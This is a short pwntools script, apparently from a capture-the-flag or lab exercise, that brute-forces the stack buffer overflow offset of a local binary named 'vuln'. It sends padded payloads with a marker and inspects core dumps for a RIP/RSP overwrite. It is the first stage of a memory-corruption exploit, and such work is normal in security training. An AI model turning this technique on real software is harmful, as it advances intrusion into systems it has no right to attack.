#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.log_level = 'error'

for offset in range(100, 140):
    p = process('/workspace/vuln')
    p.sendline(b'84')
    p.recvuntil(b'Name? ')
    
    # Probar con diferente offset
    payload = b'A' * offset + b'BCDEFGHI'
    p.sendline(payload)
    
    try:
        p.recvall(timeout=0.5)
    except:
        pass
    
    p.wait()
    
    try:
        core = p.corefile
        rsp_val = core.read(core.rsp, 8)
        if b'BCDEFGHI' in rsp_val or core.rip == u64(b'BCDEFGHI'):
            print(f"Offset encontrado: {offset}")
            print(f"RIP: {hex(core.rip)}")
            print(f"RSP value: {rsp_val}")
            break
    except:
        pass
    
    p.close()
